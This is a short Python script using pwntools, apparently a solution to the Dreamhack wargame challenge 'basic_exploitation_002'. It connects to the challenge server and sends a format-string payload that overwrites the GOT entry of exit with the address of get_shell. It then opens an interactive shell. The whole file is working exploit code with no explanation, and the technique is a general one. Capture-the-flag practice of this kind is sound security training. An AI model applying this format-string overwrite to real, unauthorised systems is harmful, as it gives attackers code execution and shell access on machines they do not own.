#!/usr/bin/python
from pwn import *

r=remote("host1.dreamhack.games",13846)
print("remote success")

e=ELF("./basic_exploitation_002")
get_shell=e.symbols['get_shell']
exit_got=e.got['exit']

r.sendline(fmtstr_payload(1,{exit_got: get_shell}))
r.interactive()

